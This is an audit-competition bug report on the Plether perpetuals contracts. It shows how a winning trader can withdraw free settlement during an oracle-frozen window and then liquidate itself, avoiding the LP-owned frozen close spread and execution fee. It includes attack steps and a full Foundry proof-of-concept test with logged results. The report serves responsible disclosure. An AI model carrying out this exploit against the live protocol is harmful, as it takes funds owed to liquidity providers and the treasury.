# \#98877 [SC-Medium] A winning trader can exit an oracle frozen window through its own liquidation and skip the LP owned frozen close spread

**Submitted on Nov 10th 2026 at 17:32:42 UTC by @tchoupilou for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98877
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

While the oracle is frozen, a voluntary close pays a fixed LP owned spread of 50 bps of notional plus the 4 bps execution fee. A liquidation pays neither. A trader whose PnL pledge has been consumed by carry can withdraw its free settlement inside the frozen window. One second later the first unpaid second of carry makes the position liquidatable whatever its price health, and the trader liquidates itself as keeper and gets half of the liquidation charge back. On a 1.152M USDG position at release parameters the voluntary close costs the trader 50.8 bps net and the self liquidation 7.5 bps. The trader keeps 4,988.15 USDG more, the LP pool collects 4,527.35 USDG less and the treasury 460.80 USDG less. Outside the frozen window the same self liquidation costs the trader more than a voluntary close, so the advantage exists only because the frozen spread is not applied.

## Vulnerability Details

A voluntary close executed while the oracle is frozen is charged `frozenCloseSpreadBps` on the closed notional (`CloseAccountingLib.sol:122-124`). SECURITY.md:838-840 describes this spread as the frozen market replacement for the adverse confidence shift and states that it is LP owned. A liquidation does not assess it (SECURITY.md:843). Its only charge is `notional x bountyBps / 1e4` (`LiquidationAccountingLib.sol:65`), split half to the keeper and half to the pool at release, plus the adverse confidence shift that liquidation pricing keeps.

The design treats liquidation as something that happens to an unsafe account. One trigger does not depend on price health at all. `CfdEnginePlanLib.planLiquidation` marks the position liquidatable whenever pending carry is not fully realized (`CfdEnginePlanLib.sol:1465-1469`), and ACCOUNTING_SPEC.md:700-701 states that any uncovered carry remainder independently makes the account liquidatable. Carry is collected from the position margin first and then from free settlement (ACCOUNTING_SPEC.md:696-697).

The owner controls the second source. During the frozen window `withdrawMargin` realizes carry first (`CfdEngineSettlementSidecar.sol:283`), then only checks that the position stays healthy on pledge plus claim plus price PnL at the larger of the initial and FAD margins, 300 bps at release (`CfdEngineSettlementSidecar.sol:287-331`). A winner with more than 3% of price PnL passes this check with a zero pledge and withdraws all of its free settlement. Both carry sources are then empty. In the same second nothing is unpaid and `executeLiquidation` reverts with `CfdEngine__PositionIsSolvent()` (selector `0x451cebb2`). One second later the carry accrued since the withdrawal cannot be paid and the account is liquidatable. `OrderRouter.executeLiquidation` is permissionless and pays the caller as keeper (`OrderRouter.sol:486-500`), and the engine handles `keeper == account` (`CfdEngine.sol:1331-1336`).

So once the pledge is gone, the trader alone decides during a frozen window whether its exit costs 50.8 bps or 7.5 bps. The protocol prices an exit at a stale frozen mark with this spread (SECURITY.md:838-845), and the self liquidation buys the same exit for about a seventh of that price.

SECURITY.md:1442, inside Known Limitations, says that the frozen market stale price protection applies to oracle frozen voluntary closes only. That line, and the liveness reason given at SECURITY.md:845, describe the liquidation of an unsafe account, which must stay possible during closures. This report is about a solvent account that turns its own voluntary exit into a liquidation at a time it chooses, with its own withdrawal as the only lever. The suggested fix below does not touch liquidation liveness because the accounts it targets have the PnL to pay the spread.

### Preconditions

- The pledge must be entirely consumed by carry. There is no `removeMargin`, added margin only delays it, and carry is the only debit of a winning pledge. In the PoC it takes 73 days when another trader holds a 4.8M USDG LONG on the same side of an 18M USDG pool and 360 days when the winner is alone. Carry scales with side utilization, so it is faster in a busier book.
- The position must stay above the 300 bps FAD margin on pledge plus claim plus price PnL at every FAD window of the holding period. Free settlement does not count for price health (`CfdEnginePlanLib.sol:1461`), so in practice the price PnL must stay above about 3% of notional on every weekend. The PoC moves the basket 4% in favour of the LONG right after the open and keeps it there.
- Free settlement must cover carry until the frozen window, otherwise any keeper can liquidate the account earlier on the carry trigger.

### Attack

1. Hold a winning position at minimum practical margin until carry has consumed the pledge, with free settlement in the account and price PnL above 3% at every FAD window.
2. During a frozen window, call `MarginClearinghouse.withdrawMargin(0)` to realize carry, then `withdrawMargin` for the whole free settlement.
3. One or two seconds later, call `OrderRouter.executeLiquidation(self, [])`. If a third party liquidates first, the trader still keeps 4,380.74 USDG more than with the voluntary close, so there is no race to win.

### Suggested fix

When the oracle is frozen, charge `frozenCloseSpreadBps` on a liquidation whose price health passes and whose only trigger is uncovered carry, or reject a withdrawal of free settlement during the frozen window when it leaves the account unable to pay carry.

## Impact Details

The LP pool does not collect the frozen close spread that the protocol assigns to it for this exit, and the treasury does not collect the execution fee. The trader keeps both. The pool pays the same price PnL at the same frozen mark in both branches. Release parameters throughout: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, `initMarginBps` 20, `maintMarginBps` 10, `fadMarginBps` 300, `baseCarryBps` 500, `bountyBps` 10, `keeperShareBps` 5000, `executionFeeBps` 4, `frozenCloseSpreadBps` 50, `fadMaxStaleness` 3 days, `maxSeniorShareBps` 8000, `maxSeniorExposureAssets` 40M, `basketMaxConfidenceRatioBps` 10, `adverseConfidenceMultiplierBps` 2500. Pool of 10M USDG Junior and 8M USDG Senior. Basket moved from 1.20 to 1.152 in favour of the LONG.

| book | days until the pledge is consumed | trader gain over a voluntary close | LP pool collects less | treasury collects less |
|---|---|---|---|---|
| winner alone, 1.2M USDG LONG | 360 | 4,988.15 USDG (43 bps of notional) | 4,527.35 USDG | 460.80 USDG |
| another trader holds a 4.8M USDG LONG | 73 | 4,956.88 USDG (43 bps of notional) | 4,496.08 USDG | 460.80 USDG |

From the `FrozenCloseSpreadSettled`, `ActionChargeSettled` and `PositionLiquidated` events of the alone run (visible with `-vvvv`), the voluntary close is charged 5,852.29 USDG: the 5,760.00 spread and the 460.80 fee, net of the 368.51 VPI rebate that the close earns. The self liquidation costs 864.14 USDG: the 576.14 half of the liquidation charge kept by the pool and 288.00 of adverse confidence shift. The difference is the trader gain. The trader gain equals the LP shortfall plus the treasury shortfall to the atom, and no trader claim, locked margin or third-party balance is left in either branch.

Measured controls in the same PoC: on a live Tuesday the same withdrawal plus self liquidation costs the trader 255.67 USDG more than a voluntary close, so the ordering the protocol relies on, where a liquidation costs more than a close, inverts only while the frozen spread applies. Without the withdrawal the account is solvent and the self liquidation reverts.

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1461-L1469
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L122-L124
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/LiquidationAccountingLib.sol#L65
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L283
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L287-L331
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L724-L748
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L486-L500
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1331-L1336
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L838-L845
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1442
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L696-L701
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L146-L147

## Proof of Concept

Save the file below as `packages/perps/test/perps/FrozenSelfLiquidationSpread.t.sol` and run from `packages/perps`:

```
FOUNDRY_VIA_IR=false FOUNDRY_OPTIMIZER=false forge test --match-contract FrozenSelfLiquidationSpreadTest -vv --threads 1 --gas-limit 30000000000
```

The test inherits the project fixture `BasePerpTest`. In `setUp` the owner installs the release pool caps, and `vm.prank(address(router))` calls `PletherOracle.applyConfig` with the release confidence policy (`basketMaxConfidenceRatioBps` 10, `adverseConfidenceMultiplierBps` 2500, DEPLOYMENT.md:146-147), as a finalized Router oracle config does. The release multiplier is stricter on liquidation pricing than the source default of 2000, so it reduces the measured gain. The trader, the keeper and the LPs are ordinary addresses that call production entrypoints. While the oracle is frozen PletherOracle replays the engine mark, so the mock Pyth prices do not enter the frozen branches.

Each comparison starts from one snapshot taken on a Saturday at noon UTC with the oracle frozen. Branch A is the voluntary full close executed by a third-party keeper. Branch B is the withdrawal followed two seconds later by the self liquidation. In `-vvvv` traces branch A emits `FrozenCloseSpreadSettled` with a waived part of 368.51 USDG. That part is the VPI rebate netted against the spread by `_recoveredFrozenSpreadAssets` (`CfdEngineSettlementSidecar.sol:724-748`), not a waiver of the charge. `test_triggerIsTheFirstUnpaidSecondOfCarry` shows that the trigger is carry and not price health, `test_thirdPartyKeeperAfterWithdrawal` shows that there is no race, `test_control_withoutWithdrawalNotLiquidatable` and `test_control_liveWeekdaySelfLiquidationCostsMore` are the negative controls. `0x451cebb2` in the logs is `CfdEngine__PositionIsSolvent()`.

Output:

```
Ran 6 tests for test/perps/FrozenSelfLiquidationSpread.t.sol:FrozenSelfLiquidationSpreadTest
[PASS] test_control_liveWeekdaySelfLiquidationCostsMore() (gas: 34207664)
Logs:
  winner pledge after open              3920602400
  == live weekday: self-liquidation costs more 255672551

[PASS] test_control_withoutWithdrawalNotLiquidatable() (gas: 114563060)
Logs:
  winner pledge after open              3920602400
  control: executeLiquidation reverted
  0x451cebb2

[PASS] test_selfLiquidationSkipsFrozenCloseSpread() (gas: 117111062)
Logs:
  winner pledge after open              3920602400
  free settlement withdrawn             53970511665
  == days held until carry consumed the pledge  360
  == notional at the frozen mark (USDG atoms)   1152000000000
  == A voluntary close, trader wealth           97047951543
  == B self-liquidation, trader wealth          102036097412
  == trader gain B - A                          4988145869
  == trader gain B - A, bps of notional         43
  == A pool assets                              17964011156457
  == B pool assets                              17959483810588
  == LP pool loss A - B                         4527345869
  == treasury loss A - B                        460800000

[PASS] test_selfLiquidationSkipsFrozenCloseSpread_busyBook() (gas: 34310608)
Logs:
  winner pledge after open              3920602400
  free settlement withdrawn             53833720039
  == days held until carry consumed the pledge  73
  == notional at the frozen mark (USDG atoms)   1152000000000
  == A voluntary close, trader wealth           96942425009
  == B self-liquidation, trader wealth          101899304778
  == trader gain B - A                          4956879769
  == trader gain B - A, bps of notional         43
  == A pool assets                              17973711084343
  == B pool assets                              17969215004574
  == LP pool loss A - B                         4496079769
  == treasury loss A - B                        460800000

[PASS] test_thirdPartyKeeperAfterWithdrawal() (gas: 34301982)
Logs:
  winner pledge after open              3920602400
  == third-party keeper received              576144000
  == winner gain over the voluntary close      4380735769

[PASS] test_triggerIsTheFirstUnpaidSecondOfCarry() (gas: 32593224)
Logs:
  winner pledge after open              3920602400
  same second: executeLiquidation reverted
  0x451cebb2

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 2.03s (1.99s CPU time)
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
// vm.getBlockTimestamp() throughout: under via-IR `block.timestamp` is cached inside a test function after vm.warp.
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console} from "forge-std/console.sol";

/// @notice While the oracle is frozen, a voluntary close pays the LP-owned frozen close spread (50 bps of notional at
///         release) plus the 4 bps execution fee. A liquidation pays neither. A winning trader whose PnL pledge has been
///         consumed by carry withdraws its free settlement during the frozen window (the withdrawal guard only tests
///         pledge + claim + price PnL against the 300 bps FAD margin) and, two seconds later, the first unpaid second of
///         carry makes the position liquidatable whatever its equity (CfdEnginePlanLib.sol:1465-1469). The trader then
///         liquidates itself as keeper and receives half of the liquidation charge back.
///
///         Every step uses production entrypoints: `TrancheVault.requestDeposit/claimDeposit`,
///         `MarginClearinghouse.deposit/withdrawMargin`, `OrderRouter.commitOrder/executeOrder/updateMarkPrice/
///         settleLpEpoch/executeLiquidation`. The owner only installs the release pool caps in setUp and the Router
///         applies the release oracle confidence policy, as a finalized Router oracle config does. Risk parameters
///         are the release values of DEPLOYMENT.md.
contract FrozenSelfLiquidationSpreadTest is BasePerpTest {

    address internal juniorLp = makeAddr("juniorLp");
    address internal juniorLp2 = makeAddr("juniorLp2");
    address internal seniorLp = makeAddr("seniorLp");
    address internal winner = makeAddr("winner");
    address internal otherTrader = makeAddr("otherTrader");
    address internal keeper = makeAddr("keeper");

    uint256 internal constant PRICE = 1.2e8;
    /// @dev A LONG profits when the basket falls; 1.152 is a 4 % move, above the 300 bps FAD margin.
    uint256 internal constant FAVOURABLE = 1.152e8;
    uint256 internal constant SIZE = 1_000_000e18; // 1.2M USDG notional at 1.20
    uint256 internal constant OPEN_MARGIN = 6_000e6;
    uint256 internal constant WINNER_FUNDS = 60_000e6;
    /// @dev Confidence just under the 10 bps basket maximum of the release oracle policy.
    uint256 internal constant PYTH_CONF_BPS = 9;

    uint256 internal clientNonce;

    struct Branch {
        uint256 traderWealth;
        uint256 poolAssets;
        uint256 treasuryAssets;
        uint256 sizeAfter;
    }

    // ---------------------------------------------------------------- release configuration

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        vm.warp(SETUP_TIMESTAMP);

        IPletherOracle.OracleConfig memory oracleConfig = IPletherOracle.OracleConfig({
            orderExecutionStalenessLimit: pletherOracle.orderExecutionStalenessLimit(),
            liquidationStalenessLimit: pletherOracle.liquidationStalenessLimit(),
            basketMaxConfidenceRatioBps: 10,
            orderSettlementWindow: pletherOracle.orderSettlementWindow(),
            maxComponentPublishTimeDivergence: pletherOracle.maxComponentPublishTimeDivergence(),
            adverseConfidenceMultiplierBps: 2500
        });
        vm.prank(address(router));
        pletherOracle.applyConfig(oracleConfig);

        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozen close spread");
        assertEq(engine.fadMaxStaleness(), 3 days, "release frozen mark age limit");
    }

    // ---------------------------------------------------------------- production entrypoints

    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(price)),
            SafeCast.toUint64(price * PYTH_CONF_BPS / 10_000),
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _requestDeposit(
        address lp,
        uint256 amount,
        bool senior
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        if (senior) {
            settlementToken.approve(address(seniorVault), amount);
            requestId = seniorVault.requestDeposit(amount, lp, lp);
        } else {
            settlementToken.approve(address(juniorVault), amount);
            requestId = juniorVault.requestDeposit(amount, lp, lp);
        }
        vm.stopPrank();
    }

    function _claimDeposit(
        address lp,
        uint256 requestId,
        bool senior
    ) internal {
        vm.startPrank(lp);
        if (senior) {
            seniorVault.claimDeposit(requestId, seniorVault.claimableDepositRequest(requestId, lp), lp, lp);
        } else {
            juniorVault.claimDeposit(requestId, juniorVault.claimableDepositRequest(requestId, lp), lp, lp);
        }
        vm.stopPrank();
    }

    function _settleAsKeeper(
        uint256 price
    ) internal {
        bytes[] memory pythUpdate = _pyth(price);
        vm.prank(keeper);
        router.settleLpEpoch(pythUpdate);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory pythUpdate = _pyth(price);
        vm.prank(keeper);
        router.updateMarkPrice(pythUpdate);
    }

    /// @dev 10M USDG Junior and 8M USDG Senior enter through the public async path.
    function _setupLps() internal {
        uint256 r1 = _requestDeposit(juniorLp, 2_500_000e6, false);
        uint256 r2 = _requestDeposit(juniorLp2, 7_500_000e6, false);
        if (vm.getBlockTimestamp() < juniorVault.depositEpochStart(r1)) {
            vm.warp(juniorVault.depositEpochStart(r1));
        }
        _settleAsKeeper(1e8);
        _claimDeposit(juniorLp, r1, false);
        _claimDeposit(juniorLp2, r2, false);
        uint256 r3 = _requestDeposit(seniorLp, 8_000_000e6, true);
        if (vm.getBlockTimestamp() < seniorVault.depositEpochStart(r3)) {
            vm.warp(seniorVault.depositEpochStart(r3));
        }
        _settleAsKeeper(1e8);
        _claimDeposit(seniorLp, r3, true);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 60);
        _refreshMark(PRICE);
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("frozen-self-liquidation", ++clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _commitAndExecute(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, size, margin, isClose);
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory pythUpdate = _pyth(price);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, pythUpdate);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    // ---------------------------------------------------------------- views

    function _wealth(
        address account
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(account) + clearinghouse.balanceAssets(account);
    }

    function _treasury() internal view returns (uint256) {
        address t = engine.protocolTreasury();
        return settlementToken.balanceOf(t) + clearinghouse.balanceAssets(t);
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _dayOfWeek() internal view returns (uint256) {
        return ((vm.getBlockTimestamp() / 1 days) + 4) % 7;
    }

    function _free(
        address account
    ) internal view returns (uint256) {
        IMarginClearinghouse.AccountAssetBuckets memory b = clearinghouse.getAccountAssetBuckets(account);
        return b.freeSettlementAssets;
    }

    function _measure() internal view returns (Branch memory b) {
        b.traderWealth = _wealth(winner);
        b.poolAssets = pool.totalAssets();
        b.treasuryAssets = _treasury();
        b.sizeAfter = _size(winner);
    }

    // ---------------------------------------------------------------- scenario

    /// @dev Opens the winning LONG at minimum practical margin, optionally lets another trader open an ordinary LONG
    ///      (carry scales with side utilization), moves the basket 4 % in the LONG's favour, then lets carry run on
    ///      weekdays (mark refresh + zero withdrawal checkpoint each day) until carry has consumed the winner's pledge.
    function _arrangeWinnerWithConsumedPledge(
        uint256 crowdSize
    ) internal returns (uint256 daysHeld) {
        _setupLps();
        _fundTrader(winner, WINNER_FUNDS);
        _commitAndExecute(winner, CfdTypes.Side.LONG, SIZE, OPEN_MARGIN, false, PRICE);
        assertEq(_size(winner), SIZE, "winner LONG open");
        console.log("winner pledge after open             ", clearinghouse.pnlPledgeAssets(winner));
        if (crowdSize != 0) {
            _fundTrader(otherTrader, 200_000e6);
            _commitAndExecute(otherTrader, CfdTypes.Side.LONG, crowdSize, 40_000e6, false, PRICE);
        }
        _refreshMark(FAVOURABLE);

        for (daysHeld = 1; daysHeld <= 400; daysHeld++) {
            vm.warp(vm.getBlockTimestamp() + 1 days);
            uint256 dow = _dayOfWeek();
            if (dow == 0 || dow == 6) {
                continue;
            }
            _refreshMark(FAVOURABLE);
            vm.prank(winner);
            clearinghouse.withdrawMargin(0);
            if (clearinghouse.pnlPledgeAssets(winner) == 0) {
                break;
            }
        }
        assertEq(clearinghouse.pnlPledgeAssets(winner), 0, "carry consumed the pledge");
        assertGt(_free(winner), 1_000e6, "a free buffer remains");
        assertEq(_size(winner), SIZE, "position still open");
    }

    /// @dev Next Friday 19:00 UTC (before the FAD window): last live mark. Then Saturday 12:00 UTC, oracle frozen.
    function _enterFrozenWindow() internal {
        uint256 dow = _dayOfWeek();
        uint256 daysToFriday = (5 + 7 - dow) % 7;
        uint256 startOfDay = vm.getBlockTimestamp() - (vm.getBlockTimestamp() % 1 days);
        uint256 friday = startOfDay + daysToFriday * 1 days + 19 hours;
        if (friday <= vm.getBlockTimestamp()) {
            friday += 7 days;
        }
        vm.warp(friday);
        _refreshMark(FAVOURABLE);
        vm.prank(winner);
        clearinghouse.withdrawMargin(0);
        vm.warp(friday + 17 hours);
        assertEq(_dayOfWeek(), 6, "Saturday");
        assertTrue(engine.isOracleFrozen(), "oracle frozen");
        assertEq(clearinghouse.pnlPledgeAssets(winner), 0, "pledge still consumed");
    }

    /// @dev Branch A, the ordinary exit: the winner commits a full close and a third-party keeper executes it.
    function _voluntaryClose() internal returns (Branch memory b) {
        _commitAndExecute(winner, CfdTypes.Side.LONG, SIZE, 0, true, FAVOURABLE);
        b = _measure();
    }

    /// @dev Branch B: the winner checkpoints carry, withdraws all free settlement, waits two seconds and liquidates
    ///      itself through the permissionless router entrypoint.
    function _selfLiquidation() internal returns (Branch memory b) {
        vm.prank(winner);
        clearinghouse.withdrawMargin(0);
        uint256 free = _free(winner);
        vm.prank(winner);
        clearinghouse.withdrawMargin(free);
        console.log("free settlement withdrawn            ", free);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 2);
        bytes[] memory noUpdate = new bytes[](0);
        vm.prank(winner);
        router.executeLiquidation(winner, noUpdate);
        b = _measure();
    }

    function _runComparison(
        uint256 crowdSize
    ) internal {
        uint256 daysHeld = _arrangeWinnerWithConsumedPledge(crowdSize);
        _enterFrozenWindow();
        uint256 notional = SIZE * engine.lastMarkPrice() / 1e20;
        uint256 snap = vm.snapshotState();

        Branch memory a = _voluntaryClose();
        vm.revertToState(snap);
        Branch memory b = _selfLiquidation();
        vm.revertToState(snap);

        console.log("== days held until carry consumed the pledge ", daysHeld);
        console.log("== notional at the frozen mark (USDG atoms)  ", notional);
        console.log("== A voluntary close, trader wealth          ", a.traderWealth);
        console.log("== B self-liquidation, trader wealth         ", b.traderWealth);
        console.log("== trader gain B - A                         ", b.traderWealth - a.traderWealth);
        console.log("== trader gain B - A, bps of notional        ", (b.traderWealth - a.traderWealth) * 10_000 / notional);
        console.log("== A pool assets                             ", a.poolAssets);
        console.log("== B pool assets                             ", b.poolAssets);
        console.log("== LP pool loss A - B                        ", a.poolAssets - b.poolAssets);
        console.log("== treasury loss A - B                       ", a.treasuryAssets - b.treasuryAssets);

        assertEq(a.sizeAfter, 0, "A closed");
        assertEq(b.sizeAfter, 0, "B liquidated");
        assertGt(b.traderWealth, a.traderWealth, "self-liquidation pays the trader more than the voluntary close");
        assertGt(a.poolAssets, b.poolAssets, "and the LP pool funds the difference");
    }

    function test_selfLiquidationSkipsFrozenCloseSpread() public {
        _runComparison(0);
    }

    /// @dev Busier book: another trader holds a 4.8M USDG LONG, about a third of pool depth, so carry consumes the
    ///      winner's pledge several times faster.
    function test_selfLiquidationSkipsFrozenCloseSpread_busyBook() public {
        _runComparison(4_000_000e18);
    }

    /// @dev Negative control: without the withdrawal the free buffer pays the accrued carry, the position is solvent
    ///      and the same self-liquidation call does not close it.
    function test_control_withoutWithdrawalNotLiquidatable() public {
        _arrangeWinnerWithConsumedPledge(0);
        _enterFrozenWindow();
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 2);
        bytes[] memory noUpdate = new bytes[](0);
        vm.prank(winner);
        try router.executeLiquidation(winner, noUpdate) {
            console.log("control: executeLiquidation returned without reverting");
        } catch (bytes memory reason) {
            console.log("control: executeLiquidation reverted");
            console.logBytes(reason);
        }
        assertEq(_size(winner), SIZE, "a solvent winner with free settlement is not liquidated");
    }

    /// @dev The trigger is uncovered carry, not price health: in the same second as the withdrawal nothing is unpaid
    ///      and the liquidation reverts as solvent, one second later the account is liquidated.
    function test_triggerIsTheFirstUnpaidSecondOfCarry() public {
        _arrangeWinnerWithConsumedPledge(4_000_000e18);
        _enterFrozenWindow();
        vm.prank(winner);
        clearinghouse.withdrawMargin(0);
        uint256 free = _free(winner);
        vm.prank(winner);
        clearinghouse.withdrawMargin(free);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory noUpdate = new bytes[](0);
        vm.prank(winner);
        try router.executeLiquidation(winner, noUpdate) {
            revert("same second: the account must still be solvent");
        } catch (bytes memory reason) {
            console.log("same second: executeLiquidation reverted");
            console.logBytes(reason);
        }
        assertEq(_size(winner), SIZE, "not liquidated in the same second");
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(winner);
        router.executeLiquidation(winner, noUpdate);
        assertEq(_size(winner), 0, "liquidated one second later");
    }

    /// @dev No race to win: if a third-party keeper liquidates after the withdrawal, the winner still beats the
    ///      voluntary close and only loses the keeper half of the charge.
    function test_thirdPartyKeeperAfterWithdrawal() public {
        _arrangeWinnerWithConsumedPledge(4_000_000e18);
        _enterFrozenWindow();
        uint256 snap = vm.snapshotState();
        _voluntaryClose();
        uint256 wealthA = _wealth(winner);
        vm.revertToState(snap);
        vm.prank(winner);
        clearinghouse.withdrawMargin(0);
        uint256 free = _free(winner);
        vm.prank(winner);
        clearinghouse.withdrawMargin(free);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 2);
        bytes[] memory noUpdate = new bytes[](0);
        uint256 keeperBefore = _wealth(keeper);
        vm.prank(keeper);
        router.executeLiquidation(winner, noUpdate);
        uint256 wealthB = _wealth(winner);
        console.log("== third-party keeper received             ", _wealth(keeper) - keeperBefore);
        console.log("== winner gain over the voluntary close     ", wealthB - wealthA);
        assertEq(_size(winner), 0, "liquidated by the third party");
        assertGt(wealthB, wealthA, "the winner still gains over the voluntary close");
    }

    /// @dev Negative control outside the frozen window: on a live Tuesday the same withdrawal plus self-liquidation
    ///      costs the trader MORE than a voluntary close. The ordering the protocol relies on (a liquidation costs more
    ///      than a close) only inverts while the frozen spread applies.
    function test_control_liveWeekdaySelfLiquidationCostsMore() public {
        _arrangeWinnerWithConsumedPledge(4_000_000e18);
        uint256 dow = _dayOfWeek();
        uint256 startOfDay = vm.getBlockTimestamp() - (vm.getBlockTimestamp() % 1 days);
        uint256 daysToTuesday = (2 + 7 - dow) % 7;
        if (daysToTuesday == 0) {
            daysToTuesday = 7;
        }
        vm.warp(startOfDay + daysToTuesday * 1 days + 12 hours);
        _refreshMark(FAVOURABLE);
        vm.prank(winner);
        clearinghouse.withdrawMargin(0);
        assertFalse(engine.isOracleFrozen(), "live");
        assertFalse(engine.isFadWindow(), "not FAD");
        uint256 snap = vm.snapshotState();
        _commitAndExecute(winner, CfdTypes.Side.LONG, SIZE, 0, true, FAVOURABLE);
        uint256 wealthA = _wealth(winner);
        vm.revertToState(snap);
        vm.prank(winner);
        clearinghouse.withdrawMargin(0);
        uint256 free = _free(winner);
        vm.prank(winner);
        clearinghouse.withdrawMargin(free);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes[] memory update = _pyth(FAVOURABLE);
        vm.prank(winner);
        router.executeLiquidation(winner, update);
        uint256 wealthB = _wealth(winner);
        assertEq(_size(winner), 0, "self-liquidated on the live weekday");
        console.log("== live weekday: self-liquidation costs more", wealthA - wealthB);
        assertLt(wealthB, wealthA, "outside the frozen window self-liquidation is the worse exit");
    }

}
```
